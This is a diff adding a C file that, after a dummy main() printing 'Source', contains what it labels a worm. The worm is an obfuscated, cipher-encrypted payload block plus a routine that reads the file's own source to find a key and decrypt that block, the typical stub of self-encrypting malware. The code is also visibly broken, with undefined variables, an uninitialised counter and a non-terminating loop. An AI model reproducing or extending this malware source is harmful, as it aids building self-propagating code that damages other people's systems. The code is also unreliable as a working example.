@@ -1,0 +1,162 @@
+#include<stdio.h>
+void main(){
+	printf("Source");
+}
+
+################## Worm written in C by Omkar Gavhane################
+//INIT_WORM-1804289383
+R6b/9h122*fg16c-5(
+R6b/9h122*fg196?-5(
+R6b/9h122*fge6b4-5(
+R6b/9h122*g6a2-5(
+R6b/9h122*fg1?cc9-5(
+R6b/9h122*hb6fg1-5(
+R6b/9h122*96?ff5=96?ff5-5(
+/5.ee.9c5.?2g#$!!!{{))}}))[[))]]))||))::));;))<<))>>)),,))..))??))//))//))11))22))33))44))55))66))77)
++88))99))aa))bb))cc))cc))dd))ee))ff))gg))hh))ii))jj))kk))ll))mm))nn))oo))pp))qq))rr))ss)
++tt))uu))vv))ww))xx))yy))zz))AA))BB))CC))DD))EE))FF))GG))HH))II))JJ))KK))LL))MM))NN)
++OO))OO))QQ))RR))SS))TT))UU))VV))WW))XX))YY))ZZ))__))!!))!!))@@))##))$$))%%))^^))&&))**)
++(())))))--))++))==@&
+/5.ee2b/elcgN/c12#:{{$&
+ic6112b/elcgX/5.ee/c12#$)6bgg82lY!
+==/5.ee2b/elcgN/c12#:{{$&
+6bgg6)7)6b12kNc3N/5.e!,,,)cge!{&
+3ceX6!{&6*fge92bX/c12Y&6__Y!
+3ceX7!{&7*fge92bX.9c5.?2gY&7__Y!
+63X/c12#6$!!.9c5.?2g#7$Y!
+6b12kNc3N/5.e!7&
+?e2.8&
+@
+@
+2b/elcgN/c12#cge__$!.9c5.?2g#X6b12kNc3N/5.e_82lYTfge92bX.9c5.?2gY$&
+@
+@
+ic611/cclpc12X/5.ee12fg#$Y!
+svyrrW3c))W3c}&
+/5.ee?h3#:{{{{$&
+/5.ee6b6gNjcea#$!!==vAvGNJBEzz&
+/5.ee96b2#:{{$&
+/5.ee/5.eN82l#}{{{$&
+6bgg6)39.4)82l&
+3c!3cc2bXNNsvyrNN))eeY&
+3c}!3cc2bX12fg)).__Y&
+3ce6bg3X3c}))))bRRRRRRRRRRRRRRRRRRRJceaaje6gg2bb6bbpp?llBa8.eet.i5.b2RRRRRRRRRRRRRRRRRbbY&
+j5692X3f/.b3X3c)))T#UUb$$$)96b2YYO!!rBsYY!
+39.4!}&
+3ceX6!{&6*fge92bX6b6gNjceaY&6__Y!
+63X96b2#6$O!6b6gNjcea#6$Y!
+39.4!{&
+?e2.8&
+@
+@
+63X39.4Y!
+82l!e.b1XY&
+fce6bg3X/5.eN82l))T911)82lY&
+3ce6bg3X3c}))TfZTffbb)96b2)/5.eN82lY&
+==ce6bg3XXTffbb)96b2Y&
+?e2.8&
+@
+@
+j5692X3f/.b3X3c)))T#UUb$$$)96b2YYO!!rBsYY!
+63Xfge/acX96b2))==zvqqNJBEzzY!!{Y!
+3ce6bg3X3c}))Tffbb)96b2Y&
+==ce6bg3XXTffbb)96b2Y&
+?e2.8&
+@
+2b/elcgX96b2)82lY&
+3ceX6!{&6*fge92bX96b2Y&6__Y!
+96b2#6$!2b/elcgN/c12#6$&
+@
+3ce6bg3X3c}))Tffbb)96b2Y&
+==ce6bg3XXTffbb)96b2Y&
+@
+j5692X3f/.b3X3c)))T#UUb$$$)96b2YYO!!rBsYY!
+63Xfge/acX96b2))==rAqqNJBEzzY!!{Y!
+3ce6bg3X3c}))Tffbb)96b2Y&
+==ce6bg3XXTffbb)96b2Y&
+?e2.8&
+@
+3ce6bg3X3c}))Tffbb)96b2Y&
+==ce6bg3XXTffbb)96b2Y&
+@
+3/9cf2X3c}Y&
+3/9cf2X3cY&
+@
+ic611f292/gG.e42gXY!
+svyrrW3c&
+/5.ee/&
+/5.ee12fg#$$!!!g2fg-//&
+3cc!!3cc2bX12fg))..Y&
+633X3cc!!!AHyyY!
+ce6bg3XXFceells6922bcgg3chb11bbY&
+2k6gXrKvGNsnvyHErY&
+@
+/cclpc12X12fgY&
+@
+ic6116b32/gXY!
+f292/gG.e42gXY&
+ce6bg3XXJceaaje6gg2bb6bb/)7hfgg3cee3hbbbbY&
+@
+6bgga.6bX6bgg.e4/))/5.eW.e4i#$YY!
+6b32/gXY&
+e2ghebb{&
+@
+//MIDD_WORM
+char alphabet1[]={'0','1','2','3','4','5','6','7','8','9','a','b','c','c','d','e','f','g','h','i','j',
+'k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F',
+'G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_',
+'!','!','@','#','$','%','^','&','*','(',')','-','+','=','{','}','[',']','|',':',';','<',
+'>',',','.','?','/'};
+char decrypt_code[500];
+void decrypt_algo(char code[],int key){
+int i,j,index_of_char=999,ptr=0;
+for(i=0;i<strlen(code);i++){
+for(j=0;j<strlen(alphabet);j++){
+if(code[i]==alphabet1[j]){
+index_of_char=j;
+break;
+}
+}
+decrypt_code[ptr++]=alphabet1[(index_of_char-key)%strlen(alphabet1)];
+}
+}
+void decrypt(){
+FILE *fp, *fp1;
+char init_worm[]="//INIT_WORM";
+char line[500];
+char char_key[1000];
+int i,flag,key,j;
+fp=fopen(__FILE__,"r");
+while(fscanf(fp, "%[^\n] ",line) != EOF) {
+flag=1;
+for(i=0;i<strlen(init_worm);i++){
+if(line[i]!=init_worm[i]){
+flag=0;
+break;
+}
+}
+if(flag){
+while(line[i]!='\n')
+char_key[j++]=line[i];
+key=atoi(char_key);
+//sprintf(char_key,"%ld",key);
+//fprintf(fp1,"%s-%s\n",line,char_key);
+//printf("%s\n",line);
+break;
+}
+}
+while(fscanf(fp, "%[^\n] ",line) != EOF) {
+if(strcmp(line,"//MIDD_WORM")==0){
+//fprintf(fp1,"%s\n",line);
+//printf("%s\n",line);
+break;
+}
+decrypt_algo(line,key);
+for(i=0;i<strlen(line);i++){
+line[i]=encrypt_code[i];
+}
+//fprintf(fp1,"%s\n",line);
+//printf("%s\n",line);
+}
+}
+//ENDD_WORM
